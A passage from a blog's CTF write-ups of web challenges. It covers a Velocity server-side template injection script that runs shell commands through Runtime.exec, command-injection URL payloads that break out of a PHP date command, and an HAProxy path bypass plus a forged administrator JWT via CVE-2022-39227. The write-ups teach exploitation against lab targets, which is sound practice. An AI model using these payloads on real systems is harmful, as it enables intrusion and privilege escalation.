        <span class="n">bufferedReader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileReader</span><span class="o">(</span><span class="n">filePath</span><span class="o">));</span>
        <span class="nc">String</span> <span class="n">line</span><span class="o">;</span>

        <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">bufferedReader</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"TEXT"</span><span class="o">,</span> <span class="n">replacement</span><span class="o">);</span>
            <span class="n">content</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">);</span>
            <span class="n">content</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"\n"</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">bufferedReader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">bufferedReader</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">content</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Researching about Velocity Framework vulnerabilities I came across this research. <a href="https://iwconnect.com/apache-velocity-server-side-template-injection/">Apache Velocity Server-Side Template Injection - IWConnect</a></p><p>This blog explain that Velocity has directives. And one of them is the¬†<strong>#set</strong>¬†directive. With that directive you can execute system command through Java Classes and Constructors.</p><p>So, then I modified the payload that it shows us to obtain <strong>RCE</strong>.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>

<span class="k">def</span> <span class="nf">sendPayload</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://94.237.48.205:58185/</span><span class="sh">"</span>
    <span class="n">result1</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">text</span><span class="sh">"</span><span class="p">:</span> <span class="n">payload</span><span class="p">}).</span><span class="n">text</span>
    <span class="k">return</span> <span class="n">result1</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
#set($s=</span><span class="sh">""</span><span class="s">)
#set($stringClass=$s.getClass())
#set($stringBuilderClass=$stringClass.forName(</span><span class="sh">"</span><span class="s">java.lang.StringBuilder</span><span class="sh">"</span><span class="s">))
#set($inputStreamClass=$stringClass.forName(</span><span class="sh">"</span><span class="s">java.io.InputStream</span><span class="sh">"</span><span class="s">))
#set($readerClass=$stringClass.forName(</span><span class="sh">"</span><span class="s">java.io.Reader</span><span class="sh">"</span><span class="s">))
#set($inputStreamReaderClass=$stringClass.forName(</span><span class="sh">"</span><span class="s">java.io.InputStreamReader</span><span class="sh">"</span><span class="s">))
#set($bufferedReaderClass=$stringClass.forName(</span><span class="sh">"</span><span class="s">java.io.BufferedReader</span><span class="sh">"</span><span class="s">))
#set($collectorsClass=$stringClass.forName(</span><span class="sh">"</span><span class="s">java.util.stream.Collectors</span><span class="sh">"</span><span class="s">))
#set($systemClass=$stringClass.forName(</span><span class="sh">"</span><span class="s">java.lang.System</span><span class="sh">"</span><span class="s">))
#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))

#set($runtime=$stringClass.forName(</span><span class="sh">"</span><span class="s">java.lang.Runtime</span><span class="sh">"</span><span class="s">).getRuntime())
#set($process=$runtime.exec(</span><span class="sh">"</span><span class="s">cat ../flagc713d64c65.txt</span><span class="sh">"</span><span class="s">))
#set($null=$process.waitFor() )

#set($inputStream=$process.getInputStream())
#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
#set($stringBuilder=$stringBuilderConstructor.newInstance())

#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))
</span></pre></table></code></div></div><p>RCE is there. ü•≥</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240312140604.png" alt="" data-proofer-ignore></p><p>Or we can send only the payload directly into the input field, click submit and retrieve the flag.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240312140810.png" alt="" data-proofer-ignore></p><p>Get the flag. üéâ</p><h1 id="timekorp">TimeKORP</h1><p>Are you ready to unravel the mysteries and expose the truth hidden within KROP‚Äôs digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>üê≥¬†_Instancer_
üì¶¬†![web_timekorp.zip](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/zip/web_timekorp.zip)
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313220629.png" alt="" data-proofer-ignore></p><p>By looking at the file structure I could tell it‚Äôs a PHP app that shows the time in a format that is sent by the URL.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313220713.png" alt="" data-proofer-ignore></p><p>In <code class="language-plaintext highlighter-rouge">TimeController.php</code> the format value is set, if the parameter is not sent, <code class="language-plaintext highlighter-rouge">%H:%M:%S</code> is set by default. Then passes it to the TimeModel class.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$format</span> <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'format'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'format'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'%H:%M:%S'</span><span class="p">;</span>
<span class="nv">$time</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TimeModel</span><span class="p">(</span><span class="nv">$format</span><span class="p">);</span>
</pre></table></code></div></div><p>In <code class="language-plaintext highlighter-rouge">TimeModel.php</code>, the¬†<strong>format</strong>¬†value will be passed in the public function¬†<strong>__construct</strong>, this value is directly passed to <strong>exec()</strong> function. Using the <code class="language-plaintext highlighter-rouge">exec()</code> function is very dangerous since with a lack of sanitation it is possible to execute system commands.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">TimeModel</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$format</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">command</span> <span class="o">=</span> <span class="s2">"date '+"</span> <span class="mf">.</span> <span class="nv">$format</span> <span class="mf">.</span> <span class="s2">"' 2&gt;&amp;1"</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">getTime</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$time</span> <span class="o">=</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">command</span><span class="p">);</span>
        <span class="nv">$res</span>  <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$time</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$time</span> <span class="o">:</span> <span class="s1">'?'</span><span class="p">;</span>
        <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>So this is where <strong>Command Injection</strong> is happening, this line runs a shell command, with the <code class="language-plaintext highlighter-rouge">format</code> value received from the URL.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">command</span> <span class="o">=</span> <span class="s2">"date '+"</span> <span class="mf">.</span> <span class="nv">$format</span> <span class="mf">.</span> <span class="s2">"' 2&gt;&amp;1"</span><span class="p">;</span>
</pre></table></code></div></div><p>We can break the string by prefixing input with a¬†<code class="language-plaintext highlighter-rouge">'</code>¬†single-quote, then enter our command separator like <code class="language-plaintext highlighter-rouge">|</code> or <code class="language-plaintext highlighter-rouge">;</code> and then avoid the redirection at the end with adding a trailing¬†<code class="language-plaintext highlighter-rouge">#</code>¬†comment to our input.</p><p>So our request look like this:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://94.237.62.244:57142/?format<span class="o">=</span>%Y-%m-%d<span class="s1">'|id+%23
</span></pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313230912.png" alt="" data-proofer-ignore></p><p>RCE is there. ü•≥</p><p>The last step is to run¬†<code class="language-plaintext highlighter-rouge">cat /flag</code>¬†and that will print the flag.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://94.237.62.244:57142/?format<span class="o">=</span>%Y-%m-%d%27|cat+/flag+%23
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313231310.png" alt="" data-proofer-ignore></p><p>Get the flag. üéâ</p><h1 id="locktalk">LockTalk</h1><p>In ‚ÄúThe Ransomware Dystopia,‚Äù LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force‚Ä¶</p><ul><li>üê≥¬†<em>Instancer</em><li>üì¶¬†<a href="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/zip/web_locktalk.zip">web_locktalk.zip</a></ul><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240314002446.png" alt="" data-proofer-ignore></p><p>By looking at the file structure I could tell it‚Äôs a Python app that shows different endpoints.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240314003528.png" alt="" data-proofer-ignore></p><p>The main objective is to get acces to <code class="language-plaintext highlighter-rouge">/api/v1/flag</code> endpoint as an user with <code class="language-plaintext highlighter-rouge">administrator</code> role.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="nd">@api_blueprint.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/get_ticket</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">get_ticket</span><span class="p">():</span>
    <span class="n">claims</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">role</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">guest</span><span class="sh">"</span><span class="p">,</span> 
        <span class="sh">"</span><span class="s">user</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">guest_user</span><span class="sh">"</span>
    <span class="p">}</span>
    
    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="nf">generate_jwt</span><span class="p">(</span><span class="n">claims</span><span class="p">,</span> <span class="n">current_app</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">JWT_SECRET_KEY</span><span class="sh">'</span><span class="p">),</span> <span class="sh">'</span><span class="s">PS256</span><span class="sh">'</span><span class="p">,</span> <span class="n">datetime</span><span class="p">.</span><span class="nf">timedelta</span><span class="p">(</span><span class="n">minutes</span><span class="o">=</span><span class="mi">60</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">'</span><span class="s">ticket</span><span class="sh">'</span><span class="p">:</span> <span class="n">token</span><span class="p">})</span>


<span class="nd">@api_blueprint.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/chat/&lt;int:chat_id&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="nd">@authorize_roles</span><span class="p">([</span><span class="sh">'</span><span class="s">guest</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">administrator</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">chat</span><span class="p">(</span><span class="n">chat_id</span><span class="p">):</span>
    <span class="n">json_file_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">JSON_DIR</span><span class="p">,</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">chat_id</span><span class="si">}</span><span class="s">.json</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">json_file_path</span><span class="p">):</span>
        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">json_file_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">chat_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
        
        <span class="n">chat_id</span> <span class="o">=</span> <span class="n">chat_data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">chat_id</span><span class="sh">'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
        
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">'</span><span class="s">chat_id</span><span class="sh">'</span><span class="p">:</span> <span class="n">chat_id</span><span class="p">,</span> <span class="sh">'</span><span class="s">messages</span><span class="sh">'</span><span class="p">:</span> <span class="n">chat_data</span><span class="p">[</span><span class="sh">'</span><span class="s">messages</span><span class="sh">'</span><span class="p">]})</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Chat not found</span><span class="sh">'</span><span class="p">}),</span> <span class="mi">404</span>


<span class="nd">@api_blueprint.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/flag</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="nd">@authorize_roles</span><span class="p">([</span><span class="sh">'</span><span class="s">administrator</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="p">:</span> <span class="n">current_app</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">FLAG</span><span class="sh">'</span><span class="p">)}),</span> <span class="mi">200</span>

</pre></table></code></div></div><p>The different endpoints are observed, to access <code class="language-plaintext highlighter-rouge">/flag</code>, the <code class="language-plaintext highlighter-rouge">administrator</code> role is needed, it is also observed that a JWT is being created with the <strong>PS256</strong> algorithm and an expiration time of 60 minutes.</p><p>First we need to retrieve the JWT in <code class="language-plaintext highlighter-rouge">/api/v1/get_ticket</code> endpoint, but its kind of protected as shown in the image below.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240314004723.png" alt="" data-proofer-ignore></p><p>Inspecting the <code class="language-plaintext highlighter-rouge">haproxy.conf</code> file, we see that the HAProxy is denying requests to endpoints starting with <code class="language-plaintext highlighter-rouge">/api/v1/get_ticket</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>global
    daemon
    maxconn 256

defaults
    mode http
    <span class="nb">timeout </span>connect 5000ms
    <span class="nb">timeout </span>client 50000ms
    <span class="nb">timeout </span>server 50000ms

frontend haproxy
    <span class="nb">bind </span>0.0.0.0:1337
    default_backend backend
    http-request deny <span class="k">if</span> <span class="o">{</span> path_beg,url_dec <span class="nt">-i</span> /api/v1/get_ticket <span class="o">}</span>

backend backend
    balance roundrobin
    server s1 0.0.0.0:5000 maxconn 32 check
</pre></table></code></div></div><p>To bypass the rule, we can use multiple slashes <code class="language-plaintext highlighter-rouge">//</code> or <code class="language-plaintext highlighter-rouge">/./</code> to retrieve the <strong>ticket</strong>.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240314010127.png" alt="" data-proofer-ignore></p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">uwsgi</span>
<span class="n">Flask</span>
<span class="n">requests</span>
<span class="n">python_jwt</span><span class="o">==</span><span class="mf">3.3</span><span class="p">.</span><span class="mi">3</span>
</pre></table></code></div></div><p>Looking at the requirements.txt file, it is observed that the <code class="language-plaintext highlighter-rouge">python_jwt</code> version 3.3.3 used is deprecated and has an associated CVE, the <code class="language-plaintext highlighter-rouge">CVE-2022-39227</code></p><p><a href="https://github.com/user0x1337/CVE-2022-39227">user0x1337/CVE-2022-39227: CVE-2022-39227 : Proof of Concept (github.com)</a></p><p>According to this CVE, there is a flaw in the JSON Web Token verification. It is possible with a valid token to re-use its signature with modified claims.</p><p>We will download the python script and run it with the JWT that we did not obtain from the endpoint <code class="language-plaintext highlighter-rouge">/api/v1/get_ticket</code> , and we will change the role from <strong>guest</strong> to <strong>administrator</strong>.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">python3</span> <span class="n">cve_2022_39227</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">j</span> <span class="n">herecomesyourtoken</span> <span class="o">-</span><span class="n">i</span> <span class="sh">"</span><span class="s">role=administrator</span><span class="sh">"</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240314002328.png" alt="" data-proofer-ignore></p><p>The return value is a mix form of JSON and compact representation. You need to paste the entire value including ‚Äú{‚Äú and ‚Äú}‚Äù as your new JWT Web token.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Authorization: <span class="o">{</span><span class="s2">"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAzOTY2NTAsImlhdCI6MTcxMDM5MzA1MCwianRpIjoiS1dIQVhUeWRUWXhJWHdlWjIwMU5VUSIsIm5iZiI6MTcxMDM5MzA1MCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9."</span>:<span class="s2">""</span>,<span class="s2">"protected"</span>:<span class="s2">"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9"</span>, <span class="s2">"payload"</span>:<span class="s2">"eyJleHAiOjE3MTAzOTY2NTAsImlhdCI6MTcxMDM5MzA1MCwianRpIjoiS1dIQVhUeWRUWXhJWHdlWjIwMU5VUSIsIm5iZiI6MTcxMDM5MzA1MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ"</span>,<span class="s2">"signature"</span>:<span class="s2">"s-TtAkIi6JBvYqfdx9H8oWF5mA4-tOWPKGfv3rCPlIrA8ncyMgC9Ltobo_gk9GXaj9LmydRKKJPpYuCPsf8IFEmI3ex7LRx6mm84jKhTYQh09_X2U7TToEx-OEFdL7yz0OGKCQOLdBHiEYXVTGWnwIuP8tunOmws2OyVKH3FFI1SgtKAo7RtgwxD6spZBiv3R75B55mp8RDFMzh4luqmXMfV0sSw-mA8zRnr9J2Kb3Cpab88d-3HzQm99wrtwOM-t35ZDUsSFHw4CRyN4XQyuwvHlz2dltUjb8ZnPR7U8naiaSbC0MJIBmPezP26FKGpcpQpBtX5pg01zoKAu7C6OQ"</span><span class="o">}</span>
</pre></table></code></div></div><p>Then we just have to copy the modified JWT to access the endpoint <code class="language-plaintext highlighter-rouge">/api/v1/flag</code>.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240314002250.png" alt="" data-proofer-ignore></p><p>Get the flag. üéâ</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb-writeups/'>HTB Writeups</a>, <a href='/categories/cyber-apocalypse-ctf/'>Cyber Apocalypse CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Cyber+Apocalypse+2024+-+4x+Web+Challenges+Writeup+-+s4yhii%27s+Blog&url=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FCyberApocalypse-CTF2024-Web%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Cyber+Apocalypse+2024+-+4x+Web+Challenges+Writeup+-+s4yhii%27s+Blog&u=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FCyberApocalypse-CTF2024-Web%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FCyberApocalypse-CTF2024-Web%2F&text=Cyber+Apocalypse+2024+-+4x+Web+Challenges+Writeup+-+s4yhii%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Tickets-popcorn-please/">Tickets and Popcorn please!, The Day main.js Became the Key Vault</a><li><a href="/posts/CyberApocalypse-CTF2025-Web/">Cyber Apocalypse 2025 - 6x Web Challenges Writeup</a><li><a href="/posts/CyberApocalypse-CTF2024-Web/">Cyber Apocalypse 2024 - 4x Web Challenges Writeup</a><li><a href="/posts/Web-Cache-Poisoning/">Web Cache Poisoning Techniques</a><li><a href="/posts/HTB-Cyber-Apocalypse-CTF-Web-Writeups/">Cyber Apocalypse 2023 2x Web Challenges Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web-security/">web security</a> <a class="post-tag" href="/tags/owasp/">owasp</a> <a class="post-tag" href="/tags/labs/">labs</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/cms/">cms</a> <a class="post-tag" href="/tags/python/">python</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Cross-Site-Scripting-(XSS)/"><div class="card-body"> <em class="small" data-ts="1652889600" data-df="ll" > May 18, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cross Site Scripting (XSS)</h3><div class="text-muted small"><p> Cross-site scripting known as XSS is a web vulnerability in which malicious scripts are injected int benign and trusted websites. XSS occur when an attacker send malicious code in any user input fi...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Cyber-Apocalypse-CTF-Web-Writeups/"><div class="card-body"> <em class="small" data-ts="1652889600" data-df="ll" > May 18, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cyber Apocalypse 2023 2x Web Challenges Writeup</h3><div class="text-muted small"><p> Kryptos Support Checking the web page of this challenge gives a form to send an issue and an admin will review that issue. So its interesting, maybe the admin will click in that issue and we can...</p></div></div></a></div><div class="card"> <a href="/posts/CyberApocalypse-CTF2025-Web/"><div class="card-body"> <em class="small" data-ts="1742907600" data-df="ll" > Mar 25, 2025 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cyber 